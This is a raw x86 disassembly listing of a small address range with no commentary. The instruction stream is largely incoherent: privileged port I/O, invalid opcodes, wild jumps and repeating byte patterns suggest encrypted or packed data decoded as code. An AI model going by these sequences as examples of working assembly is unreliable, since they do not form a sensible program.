  4055e7:	bf 46 64 3a 0c       	mov    $0xc3a6446,%edi
  4055ec:	97                   	xchg   %eax,%edi
  4055ed:	32 d2                	xor    %dl,%dl
  4055ef:	87 4d 64             	xchg   %ecx,0x64(%ebp)
  4055f2:	3a eb                	cmp    %bl,%ch
  4055f4:	2d 9c 6a 30 80       	sub    $0x80306a9c,%eax
  4055f9:	0b 1e                	or     (%esi),%ebx
  4055fb:	66 68 32 d2          	pushw  $0xd232
  4055ff:	ff 4c 64 3a          	decl   0x3a(%esp,%eiz,2)
  405603:	ed                   	in     (%dx),%eax
  405604:	2d 9c d1 60 e9       	sub    $0xe960d19c,%eax
  405609:	a3 fd 62 68 64       	mov    %eax,0x646862fd
  40560e:	65 38 33             	cmp    %dh,%gs:(%ebx)
  405611:	ad                   	lods   %ds:(%esi),%eax
  405612:	f9                   	stc
  405613:	33 e1                	xor    %ecx,%esp
  405615:	81 82 2a 77 64 3a 8e 	addl   $0x3a47ac8e,0x3a64772a(%edx)
  40561c:	ac 47 3a 
  40561f:	66 3b 32             	cmp    (%edx),%si
  405622:	6d                   	insl   (%dx),%es:(%edi)
  405623:	ed                   	in     (%dx),%eax
  405624:	35 6c 85 e3 1f       	xor    $0x1fe3856c,%eax
  405629:	89 39                	mov    %edi,(%ecx)
  40562b:	ef                   	out    %eax,(%dx)
  40562c:	90                   	nop
  40562d:	65 c2 ef af          	gs ret $0xafef
  405631:	e5 fd                	in     $0xfd,%eax
  405633:	e8 28 64 3a a1       	call   0xa17aba60
  405638:	ed                   	in     (%dx),%eax
  405639:	d8 da                	fcomp  %st(2)
  40563b:	99                   	cltd
  40563c:	97                   	xchg   %eax,%edi
  40563d:	24 25                	and    $0x25,%al
  40563f:	66 68 e9 bf          	pushw  $0xbfe9
  405643:	da 88 9b c5 36 e5    	fimull -0x1ac93a65(%eax)
  405649:	e1 fa                	loope  0x405645
  40564b:	86 97 9b 6a 0e 12    	xchg   %dl,0x120e6a9b(%edi)
  405651:	ac                   	lods   %ds:(%esi),%al
  405652:	78 66                	js     0x4056ba
  405654:	80 6b 19 66          	subb   $0x66,0x19(%ebx)
  405658:	68 ed fc 6f a8       	push   $0xa86ffced
  40565d:	6b be c2 68 64 3a de 	imul   $0xffffffde,0x3a6468c2(%esi),%edi
  405664:	29 06                	sub    %eax,(%esi)
  405666:	3a 66 9f             	cmp    -0x61(%esi),%ah
  405669:	83 b3 e3 d0 84 c5 99 	xorl   $0xffffff99,-0x3a7b2f1d(%ebx)
  405670:	e1 a3                	loope  0x405615
  405672:	69 99 dd a0 da 99 97 	imul   $0x41808c97,-0x66255f23(%ecx),%ebx
  405679:	8c 80 41 
  40567c:	68 64 b9 a2 60       	push   $0x60a2b964
  405681:	6d                   	insl   (%dx),%es:(%edi)
  405682:	fa                   	cli
  405683:	13 4a 9b             	adc    -0x65(%edx),%ecx
  405686:	8f                   	(bad)
  405687:	ae                   	scas   %es:(%edi),%al
  405688:	88 9b c5 99 1d 68    	mov    %bl,0x681d99c5(%ebx)
  40568e:	d2 17                	rclb   %cl,(%edi)
  405690:	4b                   	dec    %ebx
  405691:	64 3a de             	fs cmp %dh,%bl
  405694:	e5 4c                	in     $0x4c,%eax
  405696:	3a 66 9f             	cmp    -0x61(%esi),%ah
  405699:	83 b3 e3 dc 84 c5 99 	xorl   $0xffffff99,-0x3a7b231d(%ebx)
  4056a0:	e1 a3                	loope  0x405645
  4056a2:	0b a6 28 8f 5a a1    	or     -0x5ea570d8(%esi),%esp
  4056a8:	ed                   	in     (%dx),%eax
  4056a9:	d8 da                	fcomp  %st(2)
  4056ab:	99                   	cltd
  4056ac:	97                   	xchg   %eax,%edi
  4056ad:	24 25                	and    $0x25,%al
  4056af:	66 68 e9 bf          	pushw  $0xbfe9
  4056b3:	da 88 9b c5 36 e5    	fimull -0x1ac93a65(%eax)
  4056b9:	e1 fa                	loope  0x4056b5
  4056bb:	86 97 9b 6a 30 80    	xchg   %dl,-0x7fcf9565(%edi)
  4056c1:	cb                   	lret
  4056c2:	18 66 68             	sbb    %ah,0x68(%esi)
  4056c5:	6d                   	insl   (%dx),%es:(%edi)
  4056c6:	fa                   	cli
  4056c7:	12 5c ed c2          	adc    -0x3e(%ebp,%ebp,8),%bl
  4056cb:	57                   	push   %edi
  4056cc:	90                   	nop
  4056cd:	ed                   	in     (%dx),%eax
  4056ce:	fd                   	std
  4056cf:	35 97 d1 fe 86       	xor    $0x86fed197,%eax
  4056d4:	97                   	xchg   %eax,%edi
  4056d5:	9b                   	fwait
  4056d6:	d2 3b                	sarb   %cl,(%ebx)
  4056d8:	4f                   	dec    %edi
  4056d9:	64 3a e5             	fs cmp %ch,%ah
  4056dc:	ac                   	lods   %ds:(%esi),%al
  4056dd:	6c                   	insb   (%dx),%es:(%edi)
  4056de:	33 a6 1d 7d c5 d3    	xor    -0x2c3a82e3(%esi),%esp
  4056e4:	a0 84 c5 99 97       	mov    0x9799c584,%al
  4056e9:	11 36                	adc    %esi,(%esi)
  4056eb:	8e 7c 47 3a          	mov    0x3a(%edi,%eax,2),%?
  4056ef:	66 e1 9c             	data16 loope 0x40568e
  4056f2:	0b 9e e1 a3 0b a6    	or     -0x59f45c1f(%esi),%ebx
  4056f8:	28 8f 36 8d c2 55    	sub    %cl,0x55c28d36(%edi)
  4056fe:	fa                   	cli
  4056ff:	8d 6e ed             	lea    -0x13(%esi),%ebp
  405702:	c2 4f 90             	ret    $0x904f
  405705:	ed                   	in     (%dx),%eax
  405706:	fd                   	std
  405707:	39 36                	cmp    %esi,(%esi)
  405709:	3f                   	aas
  40570a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40570c:	3d ed df de 74       	cmp    $0x74dedfed,%eax
  405711:	44                   	inc    %esp
  405712:	3a 66 80             	cmp    -0x80(%esi),%ah
  405715:	af                   	scas   %es:(%edi),%eax
  405716:	18 66 68             	sbb    %ah,0x68(%esi)
  405719:	37                   	aaa
  40571a:	6c                   	insb   (%dx),%es:(%edi)
  40571b:	31 e3                	xor    %esp,%ebx
  40571d:	39 32                	cmp    %esi,(%edx)
  40571f:	d8 3d 64 26 52 e9    	fdivrs 0xe9522664
  405725:	8a de                	mov    %dh,%bl
  405727:	39 68 64             	cmp    %ebp,0x64(%eax)
  40572a:	69 0e 6c 65 3a 66    	imul   $0x663a656c,(%esi),%ecx
  405730:	80 ef 19             	sub    $0x19,%bh
  405733:	66 68 ed ca          	pushw  $0xcaed
  405737:	91                   	xchg   %eax,%ecx
  405738:	8e ed                	mov    %ebp,%gs
  40573a:	bf 92 b7 9b c5       	mov    $0xc59bb792,%edi
  40573f:	ef                   	out    %eax,(%dx)
  405740:	ae                   	scas   %es:(%edi),%al
  405741:	ed                   	in     (%dx),%eax
  405742:	e3 e5                	jecxz  0x405729
  405744:	a0 9b 7a e6 54       	mov    0x54e67a9b,%al
  405749:	65 3a 13             	cmp    %gs:(%ebx),%dl
  40574c:	91                   	xchg   %eax,%ecx
  40574d:	ed                   	in     (%dx),%eax
  40574e:	fd                   	std
  40574f:	0c 60                	or     $0x60,%al
  405751:	ed                   	in     (%dx),%eax
  405752:	e0 67                	loopne 0x4057bb
  405754:	92                   	xchg   %eax,%edx
  405755:	36 d2 e9             	ss shr %cl,%cl
  405758:	d6                   	salc
  405759:	9b                   	fwait
  40575a:	c5 e5 ac             	(bad)
  40575d:	6c                   	insb   (%dx),%es:(%edi)
  40575e:	52                   	push   %edx
  40575f:	0f a3 26             	bt     %esp,(%esi)
  405762:	3a 35 80 3b 1d 66    	cmp    0x661d3b80,%dh
  405768:	68 e7 fe 6e 00       	push   $0x6efee7
  40576d:	06                   	push   %es
  40576e:	f1                   	int1
  40576f:	24 68                	and    $0x68,%al
  405771:	e9 bf 66 88 9b       	jmp    0x9bc8be35
  405776:	c5 36                	lds    (%esi),%esi
  405778:	80 43 1d 66          	addb   $0x66,0x1d(%ebx)
  40577c:	68 e7 fe 6e e1       	push   $0xe16efee7
  405781:	94                   	xchg   %eax,%esp
  405782:	13 96 e1 a2 d2 67    	adc    0x67d2a2e1(%esi),%edx
  405788:	4f                   	dec    %edi
  405789:	64 3a df             	fs cmp %bh,%bl
  40578c:	62 64 3a 66          	bound  %esp,0x66(%edx,%edi,1)
  405790:	f1                   	int1
  405791:	93                   	xchg   %eax,%ebx
  405792:	c3                   	ret
  405793:	e5 92                	in     $0x92,%eax
  405795:	61                   	popa
  405796:	47                   	inc    %edi
  405797:	72 00                	jb     0x405799
  405799:	08 f6                	or     %dh,%dh
  40579b:	24 68                	and    $0x68,%al
  40579d:	e9 bf 66 88 9b       	jmp    0x9bc8be61
  4057a2:	c5 36                	lds    (%esi),%esi
  4057a4:	80 7b 1d 66          	cmpb   $0x66,0x1d(%ebx)
  4057a8:	68 e7 fe 6e 80       	push   $0x806efee7
  4057ad:	bf 1c 66 68 dd       	mov    $0xdd68661c,%edi
  4057b2:	30 66 68             	xor    %ah,0x68(%esi)
  4057b5:	64 a3 91 91 e7 c0    	mov    %eax,%fs:0xc0e79191
  4057bb:	63 15 4d d2 af 4e    	arpl   %edx,0x4eafd24d
  4057c1:	64 3a df             	fs cmp %bh,%bl
  4057c4:	0b 64 3a 66          	or     0x66(%edx,%edi,1),%esp
  4057c8:	f1                   	int1
  4057c9:	93                   	xchg   %eax,%ebx
  4057ca:	c3                   	ret
  4057cb:	34 e5                	xor    $0xe5,%al
  4057cd:	d9 3a                	fnstcw (%edx)
  4057cf:	86 97 9b 6d 0e 04    	xchg   %dl,0x40e6d9b(%edi)
  4057d5:	ac                   	lods   %ds:(%esi),%al
  4057d6:	78 66                	js     0x40583e
  4057d8:	e5 d9                	in     $0xd9,%eax
  4057da:	3a 86 97 9b 6d 8e    	cmp    -0x71926469(%esi),%al
  4057e0:	a8 42                	test   $0x42,%al
  4057e2:	3a 66 eb             	cmp    -0x15(%esi),%ah
  4057e5:	a0 2a 8e c8 42       	mov    0x42c88e2a,%al
  4057ea:	3a 66 d1             	cmp    -0x2f(%esi),%ah
  4057ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4057ee:	3a 66 68             	cmp    0x68(%esi),%ah
  4057f1:	fd                   	std
  4057f2:	cd 9f                	int    $0x9f
  4057f4:	eb 9e                	jmp    0x405794
  4057f6:	3f                   	aas
  4057f7:	1b 7c 0c 56          	sbb    0x56(%esp,%ecx,1),%edi
  4057fb:	aa                   	stos   %al,%es:(%edi)
  4057fc:	2a 64 b7 e3          	sub    -0x1d(%edi,%esi,4),%ah
  405800:	68 84 c5 99 38       	push   $0x3899c584
  405805:	8c 84 40 68 64 b9 a2 	mov    %es,-0x5d469b98(%eax,%eax,2)
  40580c:	60                   	pusha
  40580d:	0c 71                	or     $0x71,%al
  40580f:	ad                   	lods   %ds:(%esi),%eax
  405810:	2a 64 b7 e3          	sub    -0x1d(%edi,%esi,4),%ah
  405814:	68 84 c5 99 38       	push   $0x3899c584
  405819:	8c 90 40 68 64 b9    	mov    %ss,-0x469b97c0(%eax)
  40581f:	a2 60 e5 d4 fa       	mov    %al,0xfad4e560
  405824:	32 64 3a 8e          	xor    -0x72(%edx,%edi,1),%ah
  405828:	08 42 3a             	or     %al,0x3a(%edx)
  40582b:	66 d1 6e 3a          	shrw   $1,0x3a(%esi)
  40582f:	66 68 fd cd          	pushw  $0xcdfd
  405833:	9f                   	lahf
  405834:	eb 9e                	jmp    0x4057d4
  405836:	3f                   	aas
  405837:	1b 7c 0c 56          	sbb    0x56(%esp,%ecx,1),%edi
  40583b:	aa                   	stos   %al,%es:(%edi)
  40583c:	2a 64 b7 e3          	sub    -0x1d(%edi,%esi,4),%ah
  405840:	68 84 c5 99 38       	push   $0x3899c584
  405845:	8c 44 40 68          	mov    %es,0x68(%eax,%eax,2)
  405849:	64 b9 a2 60 8c 00    	fs mov $0x8c60a2,%ecx
  40584f:	40                   	inc    %eax
  405850:	68 64 83 6c 68       	push   $0x686c8364
  405855:	64 3a ff             	fs cmp %bh,%bh
  405858:	9f                   	lahf
  405859:	9d                   	popf
  40585a:	b9 9c 6d 19 13       	mov    $0x13196d9c,%ecx
  40585f:	8e 40 42             	mov    0x42(%eax),%es
  405862:	3a 66 d1             	cmp    -0x2f(%esi),%ah
  405865:	07                   	pop    %es
  405866:	3a 66 68             	cmp    0x68(%esi),%ah
  405869:	fd                   	std
  40586a:	cd 9f                	int    $0x9f
  40586c:	3a e9                	cmp    %cl,%ch
  40586e:	87 66 88             	xchg   %esp,-0x78(%esi)
  405871:	9b                   	fwait
  405872:	c5 31                	lds    (%ecx),%esi
  405874:	00 08                	add    %cl,(%eax)
  405876:	f2 24 68             	repnz and $0x68,%al
  405879:	e9 87 66 88 9b       	jmp    0x9bc8bf05
  40587e:	c5 31                	lds    (%ecx),%esi
  405880:	80 7b 1c 66          	cmpb   $0x66,0x1c(%ebx)
  405884:	68 e7 fe 76 97       	push   $0x9776fee7
  405889:	11 2a                	adc    %ebp,(%edx)
  40588b:	0e                   	push   %cs
  40588c:	4e                   	dec    %esi
  40588d:	af                   	scas   %es:(%edi),%eax
  40588e:	78 66                	js     0x4058f6
  405890:	e5 e1                	in     $0xe1,%eax
  405892:	3a 86 97 9b 6a 0e    	cmp    0xe6a9b97(%esi),%al
  405898:	5d                   	pop    %ebp
  405899:	af                   	scas   %es:(%edi),%eax
  40589a:	78 66                	js     0x405902
  40589c:	e5 e1                	in     $0xe1,%eax
  40589e:	3a 86 97 9b 6a 8e    	cmp    -0x71956469(%esi),%al
  4058a4:	94                   	xchg   %eax,%esp
  4058a5:	41                   	inc    %ecx
  4058a6:	3a 66 eb             	cmp    -0x15(%esi),%ah
  4058a9:	a0 2e e7 86 5f       	mov    0x5f86e72e,%al
  4058ae:	57                   	push   %edi
  4058af:	66 68 8c ec          	pushw  $0xec8c
  4058b3:	43                   	inc    %ebx
  4058b4:	68 64 83 6c 68       	push   $0x686c8364
  4058b9:	64 3a ff             	fs cmp %bh,%bh
  4058bc:	9f                   	lahf
  4058bd:	9d                   	popf
  4058be:	b9 9c 6d 19 2e       	mov    $0x2e196d9c,%ecx
  4058c3:	0e                   	push   %cs
  4058c4:	04 a8                	add    $0xa8,%al
  4058c6:	78 66                	js     0x40592e
  4058c8:	e5 e1                	in     $0xe1,%eax
  4058ca:	3a 86 97 9b 6a 8e    	cmp    -0x71956469(%esi),%al
  4058d0:	9c                   	pushf
  4058d1:	41                   	inc    %ecx
  4058d2:	3a 66 eb             	cmp    -0x15(%esi),%ah
  4058d5:	a0 32 0e 76 af       	mov    0xaf760e32,%al
  4058da:	78 66                	js     0x405942
  4058dc:	e5 e1                	in     $0xe1,%eax
  4058de:	3a 86 97 9b 6a 8e    	cmp    -0x71956469(%esi),%al
  4058e4:	88 41 3a             	mov    %al,0x3a(%ecx)
  4058e7:	66 eb a0             	data16 jmp 0x40588a
  4058ea:	32 8e f4 41 3a 66    	xor    0x663a41f4(%esi),%cl
  4058f0:	d1 6e 3a             	shrl   $1,0x3a(%esi)
  4058f3:	66 68 fd cd          	pushw  $0xcdfd
  4058f7:	9f                   	lahf
  4058f8:	eb 9e                	jmp    0x405898
  4058fa:	3f                   	aas
  4058fb:	1b 7c 0c 56          	sbb    0x56(%esp,%ecx,1),%edi
  4058ff:	aa                   	stos   %al,%es:(%edi)
  405900:	2a 64 b7 e3          	sub    -0x1d(%edi,%esi,4),%ah
  405904:	68 84 c5 99 38       	push   $0x3899c584
  405909:	8c 80 43 68 64 b9    	mov    %es,-0x469b97bd(%eax)
  40590f:	a2 60 0c 2d ad       	mov    %al,0xad2d0c60
  405914:	2a 64 b7 e3          	sub    -0x1d(%edi,%esi,4),%ah
  405918:	68 84 c5 99 38       	push   $0x3899c584
  40591d:	8c 9c 43 68 64 b9 a2 	mov    %ds,-0x5d469b98(%ebx,%eax,2)
  405924:	60                   	pusha
  405925:	e5 d4                	in     $0xd4,%eax
  405927:	66 01 64 3a 8e       	add    %sp,-0x72(%edx,%edi,1)
  40592c:	34 41                	xor    $0x41,%al
  40592e:	3a 66 d1             	cmp    -0x2f(%esi),%ah
  405931:	6e                   	outsb  %ds:(%esi),(%dx)
  405932:	3a 66 68             	cmp    0x68(%esi),%ah
  405935:	fd                   	std
  405936:	cd 9f                	int    $0x9f
  405938:	eb 9e                	jmp    0x4058d8
  40593a:	3f                   	aas
  40593b:	1b 41 8c             	sbb    -0x74(%ecx),%eax
  40593e:	70 43                	jo     0x405983
  405940:	68 64 83 05 68       	push   $0x68058364
  405945:	64 3a ff             	fs cmp %bh,%bh
  405948:	9f                   	lahf
  405949:	9d                   	popf
  40594a:	68 eb d5 64 da       	push   $0xda64d5eb
  40594f:	99                   	cltd
  405950:	97                   	xchg   %eax,%edi
  405951:	33 52 0a             	xor    0xa(%edx),%edx
  405954:	a0 26 3a eb d5       	mov    0xd5eb3a26,%al
  405959:	64 da 99 97 33 d2 27 	ficompl %fs:0x27d23397(%ecx)
  405960:	4d                   	dec    %ebp
  405961:	64 3a e5             	fs cmp %ch,%ah
  405964:	ac                   	lods   %ds:(%esi),%al
  405965:	74 52                	je     0x4059b9
  405967:	5b                   	pop    %ebx
  405968:	a2 26 3a eb ed       	mov    %al,0xedeb3a26
  40596d:	64 da 99 97 34 d2 37 	ficompl %fs:0x37d23497(%ecx)
  405974:	4d                   	dec    %ebp
  405975:	64 3a e5             	fs cmp %ch,%ah
  405978:	ac                   	lods   %ds:(%esi),%al
  405979:	6c                   	insb   (%dx),%es:(%edi)
  40597a:	d2 6b 4d             	shrb   %cl,0x4d(%ebx)
  40597d:	64 3a df             	fs cmp %bh,%bl
  405980:	62 64 3a 66          	bound  %esp,0x66(%edx,%edi,1)
  405984:	f1                   	int1
  405985:	93                   	xchg   %eax,%ebx
  405986:	c3                   	ret
  405987:	e5 92                	in     $0x92,%eax
  405989:	61                   	popa
  40598a:	47                   	inc    %edi
  40598b:	72 00                	jb     0x40598d
  40598d:	08 f6                	or     %dh,%dh
  40598f:	24 68                	and    $0x68,%al
  405991:	e9 bf 66 88 9b       	jmp    0x9bc8c055
  405996:	c5 36                	lds    (%esi),%esi
  405998:	80 4f 1f 66          	orb    $0x66,0x1f(%edi)
  40599c:	68 e7 fe 6e 00       	push   $0x6efee7
  4059a1:	3b f2                	cmp    %edx,%esi
  4059a3:	24 68                	and    $0x68,%al
  4059a5:	e9 bf 66 88 9b       	jmp    0x9bc8c069
  4059aa:	c5 36                	lds    (%esi),%esi
  4059ac:	80 73 1f 66          	xorb   $0x66,0x1f(%ebx)
  4059b0:	68 e7 fe 6e e1       	push   $0xe16efee7
  4059b5:	94                   	xchg   %eax,%esp
  4059b6:	cd 80                	int    $0x80
  4059b8:	e1 e1                	loope  0x40599b
  4059ba:	ca b9 97             	lret   $0x97b9
  4059bd:	9b                   	fwait
  4059be:	b3 a0                	mov    $0xa0,%bl
  4059c0:	80 a3 1e 66 68 dd 30 	andb   $0x30,-0x229799e2(%ebx)
  4059c7:	66 68 64 a3          	pushw  $0xa364
  4059cb:	91                   	xchg   %eax,%ecx
  4059cc:	91                   	xchg   %eax,%ecx
  4059cd:	e7 c0                	out    %eax,$0xc0
  4059cf:	63 15 70 52 0a a4    	arpl   %edx,0xa40a5270
  4059d5:	26 3a eb             	es cmp %bl,%ch
  4059d8:	ed                   	in     (%dx),%eax
  4059d9:	64 da 99 97 34 d2 83 	ficompl %fs:-0x7c2dcb69(%ecx)
  4059e0:	4c                   	dec    %esp
  4059e1:	64 3a e5             	fs cmp %ch,%ah
  4059e4:	ac                   	lods   %ds:(%esi),%al
  4059e5:	6c                   	insb   (%dx),%es:(%edi)
  4059e6:	52                   	push   %edx
  4059e7:	48                   	dec    %eax
  4059e8:	a2 26 3a eb ed       	mov    %al,0xedeb3a26
  4059ed:	64 da 99 97 34 d2 b7 	ficompl %fs:-0x482dcb69(%ecx)
  4059f4:	4c                   	dec    %esp
  4059f5:	64 3a e5             	fs cmp %ch,%ah
  4059f8:	ac                   	lods   %ds:(%esi),%al
  4059f9:	6c                   	insb   (%dx),%es:(%edi)
  4059fa:	d2 eb                	shr    %cl,%bl
  4059fc:	4c                   	dec    %esp
  4059fd:	64 3a df             	fs cmp %bh,%bl
  405a00:	62 64 3a 66          	bound  %esp,0x66(%edx,%edi,1)
  405a04:	f1                   	int1
  405a05:	93                   	xchg   %eax,%ebx
  405a06:	c3                   	ret
  405a07:	e5 92                	in     $0x92,%eax
  405a09:	61                   	popa
  405a0a:	47                   	inc    %edi
  405a0b:	72 00                	jb     0x405a0d
  405a0d:	08 f6                	or     %dh,%dh
  405a0f:	24 68                	and    $0x68,%al
  405a11:	e9 bf 66 88 9b       	jmp    0x9bc8c0d5
  405a16:	c5 36                	lds    (%esi),%esi
  405a18:	80 cf 1e             	or     $0x1e,%bh
  405a1b:	66 68 e7 fe          	pushw  $0xfee7
  405a1f:	6e                   	outsb  %ds:(%esi),(%dx)
  405a20:	e1 94                	loope  0x4059b6
  405a22:	cd 80                	int    $0x80
  405a24:	e1 e1                	loope  0x405a07
  405a26:	d6                   	salc
  405a27:	b9 97 9b b3 a0       	mov    $0xa0b39b97,%ecx
  405a2c:	97                   	xchg   %eax,%edi
  405a2d:	11 36                	adc    %esi,(%esi)
  405a2f:	eb ed                	jmp    0x405a1e
  405a31:	64 da 99 97 34 52 24 	ficompl %fs:0x24523497(%ecx)
  405a38:	a0 26 3a eb ed       	mov    0xedeb3a26,%al
  405a3d:	64 da 99 97 34 d2 3b 	ficompl %fs:0x3bd23497(%ecx)
  405a44:	4c                   	dec    %esp
  405a45:	64 3a e5             	fs cmp %ch,%ah
  405a48:	ac                   	lods   %ds:(%esi),%al
  405a49:	74 d2                	je     0x405a1d
  405a4b:	5b                   	pop    %ebx
  405a4c:	4c                   	dec    %esp
  405a4d:	64 3a df             	fs cmp %bh,%bl
  405a50:	62 64 3a 66          	bound  %esp,0x66(%edx,%edi,1)
  405a54:	f1                   	int1
  405a55:	93                   	xchg   %eax,%ebx
  405a56:	c3                   	ret
  405a57:	e5 92                	in     $0x92,%eax
  405a59:	61                   	popa
  405a5a:	47                   	inc    %edi
  405a5b:	72 00                	jb     0x405a5d
  405a5d:	08 f6                	or     %dh,%dh
  405a5f:	24 68                	and    $0x68,%al
  405a61:	e9 bf 66 88 9b       	jmp    0x9bc8c125
  405a66:	c5 36                	lds    (%esi),%esi
  405a68:	80 3f 1e             	cmpb   $0x1e,(%edi)
  405a6b:	66 68 e7 fe          	pushw  $0xfee7
  405a6f:	6e                   	outsb  %ds:(%esi),(%dx)
  405a70:	00 70 f0             	add    %dh,-0x10(%eax)
  405a73:	24 68                	and    $0x68,%al
  405a75:	e9 bf 66 88 9b       	jmp    0x9bc8c139
  405a7a:	c5 36                	lds    (%esi),%esi
  405a7c:	80 23 1e             	andb   $0x1e,(%ebx)
  405a7f:	66 68 e7 fe          	pushw  $0xfee7
  405a83:	6e                   	outsb  %ds:(%esi),(%dx)
  405a84:	e9 8a 7e 7a 68       	jmp    0x68bad913
  405a89:	64 d2 9b 4b 64 3a df 	rcrb   %cl,%fs:-0x20c59bb5(%ebx)
  405a90:	62 64 3a 66          	bound  %esp,0x66(%edx,%edi,1)
  405a94:	f1                   	int1
  405a95:	93                   	xchg   %eax,%ebx
  405a96:	c3                   	ret
  405a97:	e5 92                	in     $0x92,%eax
  405a99:	61                   	popa
  405a9a:	47                   	inc    %edi
  405a9b:	72 00                	jb     0x405a9d
  405a9d:	08 f6                	or     %dh,%dh
  405a9f:	24 68                	and    $0x68,%al
  405aa1:	e9 bf 66 88 9b       	jmp    0x9bc8c165
  405aa6:	c5 36                	lds    (%esi),%esi
  405aa8:	80 7f 1e 66          	cmpb   $0x66,0x1e(%edi)
  405aac:	68 e7 fe 6e 80       	push   $0x806efee7
  405ab1:	b3 19                	mov    $0x19,%bl
  405ab3:	66 68 dd d2          	pushw  $0xd2dd
  405ab7:	65 68 64 a3 91 91    	gs push $0x9191a364
  405abd:	ed                   	in     (%dx),%eax
  405abe:	ed                   	in     (%dx),%eax
  405abf:	e7 af                	out    %eax,$0xaf
  405ac1:	74 1d                	je     0x405ae0
  405ac3:	66 68 33 b7          	pushw  $0xb733
  405ac7:	db 68 84             	fldt   -0x7c(%eax)
  405aca:	c5 99 3f 0c 10 ae    	lds    -0x51eff3c1(%ecx),%ebx
  405ad0:	2a 64 b7 db          	sub    -0x25(%edi,%esi,4),%ah
  405ad4:	68 84 c5 99 3f       	push   $0x3f99c584
  405ad9:	8c fc                	mov    %?,%esp
  405adb:	45                   	inc    %ebp
  405adc:	68 64 b9 a2 78       	push   $0x78a2b964
  405ae1:	8c 9c 45 68 64 83 6c 	mov    %ds,0x6c836468(%ebp,%eax,2)
  405ae8:	68 64 3a ff 9f       	push   $0x9fff3a64
  405aed:	9d                   	popf
  405aee:	b9 9c 6d 19 2e       	mov    $0x2e196d9c,%ecx
  405af3:	0e                   	push   %cs
  405af4:	04 a8                	add    $0xa8,%al
  405af6:	78 66                	js     0x405b5e
  405af8:	e5 e1                	in     $0xe1,%eax
  405afa:	3a 86 97 9b 6a 8e    	cmp    -0x71956469(%esi),%al
  405b00:	ac                   	lods   %ds:(%esi),%al
  405b01:	47                   	inc    %edi
  405b02:	3a 66 eb             	cmp    -0x15(%esi),%ah
  405b05:	a0 32 0e 9a ad       	mov    0xad9a0e32,%al
  405b0a:	78 66                	js     0x405b72
  405b0c:	e5 e1                	in     $0xe1,%eax
  405b0e:	3a 86 97 9b 6a 8e    	cmp    -0x71956469(%esi),%al
  405b14:	d8 47 3a             	fadds  0x3a(%edi)
  405b17:	66 eb a0             	data16 jmp 0x405aba
  405b1a:	32 ef                	xor    %bh,%ch
  405b1c:	98                   	cwtl
  405b1d:	93                   	xchg   %eax,%ebx
  405b1e:	dc ef                	fsubr  %st,%st(7)
  405b20:	ed                   	in     (%dx),%eax
  405b21:	8c e5                	mov    %fs,%ebp
  405b23:	99                   	cltd
  405b24:	97                   	xchg   %eax,%edi
  405b25:	ed                   	in     (%dx),%eax
  405b26:	fc                   	cld
  405b27:	8e 08                	mov    (%eax),%cs
  405b29:	47                   	inc    %edi
  405b2a:	3a 66 d1             	cmp    -0x2f(%esi),%ah
  405b2d:	6e                   	outsb  %ds:(%esi),(%dx)
  405b2e:	3a 66 68             	cmp    0x68(%esi),%ah
  405b31:	fd                   	std
  405b32:	cd 9f                	int    $0x9f
  405b34:	eb 9e                	jmp    0x405ad4
  405b36:	3f                   	aas
  405b37:	1b 7c 0c 56          	sbb    0x56(%esp,%ecx,1),%edi
  405b3b:	aa                   	stos   %al,%es:(%edi)
  405b3c:	2a 64 b7 e3          	sub    -0x1d(%edi,%esi,4),%ah
  405b40:	68 84 c5 99 38       	push   $0x3899c584
  405b45:	8c 44 45 68          	mov    %es,0x68(%ebp,%eax,2)
  405b49:	64 b9 a2 60 8c 00    	fs mov $0x8c60a2,%ecx
  405b4f:	45                   	inc    %ebp
  405b50:	68 64 83 6c 68       	push   $0x686c8364
  405b55:	64 3a ff             	fs cmp %bh,%bh
  405b58:	9f                   	lahf
  405b59:	9d                   	popf
  405b5a:	b9 9c 6d 19 13       	mov    $0x13196d9c,%ecx
  405b5f:	8e 40 47             	mov    0x47(%eax),%es
  405b62:	3a 66 d1             	cmp    -0x2f(%esi),%ah
  405b65:	07                   	pop    %es
  405b66:	3a 66 68             	cmp    0x68(%esi),%ah
  405b69:	fd                   	std
  405b6a:	cd 9f                	int    $0x9f
  405b6c:	3a e9                	cmp    %cl,%ch
  405b6e:	87 66 88             	xchg   %esp,-0x78(%esi)
  405b71:	9b                   	fwait
  405b72:	c5 31                	lds    (%ecx),%esi
  405b74:	00 08                	add    %cl,(%eax)
  405b76:	f2 24 68             	repnz and $0x68,%al
  405b79:	e9 87 66 88 9b       	jmp    0x9bc8c205
  405b7e:	c5 31                	lds    (%ecx),%esi
  405b80:	80 7b 19 66          	cmpb   $0x66,0x19(%ebx)
  405b84:	68 e7 fe 76 00       	push   $0x76fee7
  405b89:	80 f3 24             	xor    $0x24,%bl
  405b8c:	68 e9 bf 66 88       	push   $0x8866bfe9
  405b91:	9b                   	fwait
  405b92:	c5 36                	lds    (%esi),%esi
  405b94:	80 4b 19 66          	orb    $0x66,0x19(%ebx)
  405b98:	68 e7 fe 6e 02       	push   $0x26efee7
  405b9d:	64 50                	fs push %eax
  405b9f:	66 02 66 50          	data16 add 0x50(%esi),%ah
  405ba3:	66 02 64 52 66       	data16 add 0x66(%edx,%edx,2),%ah
  405ba8:	68 64 7a 35 80       	push   $0x80357a64
  405bad:	d3 25 66 68 ed bf    	shll   %cl,0xbfed6866
  405bb3:	9a b7 9b c5 de 80 0a 	lcall  $0xa80,$0xdec59bb7
  405bba:	3a 66 9f             	cmp    -0x61(%esi),%ah
  405bbd:	82 b3 e3 8c bb c5 99 	xorb   $0x99,-0x3a44731d(%ebx)
  405bc4:	e1 a2                	loope  0x405b68
  405bc6:	b7 e3                	mov    $0xe3,%bh
  405bc8:	68 84 c5 99 38       	push   $0x3899c584
  405bcd:	8c 08                	mov    %cs,(%eax)
  405bcf:	46                   	inc    %esi
  405bd0:	68 64 50 66 e5       	push   $0xe5665064
  405bd5:	d9 c2                	fld    %st(2)
  405bd7:	b9 97 9b 6d 36       	mov    $0x366d9b97,%ecx
  405bdc:	e5 d9                	in     $0xd9,%eax
  405bde:	3a 86 97 9b 6d 99    	cmp    -0x66926469(%esi),%al
  405be4:	dd 98 e5 99 97 8c    	fstpl  -0x7368661b(%eax)
  405bea:	30 46 68             	xor    %al,0x68(%esi)
  405bed:	64 c5 d3 94          	(bad)
  405bf1:	bb c5 99 80 c7       	mov    $0xc78099c5,%ebx
  405bf6:	24 66                	and    $0x66,%al
  405bf8:	68 55 fa 26 83       	push   $0x8326fa55
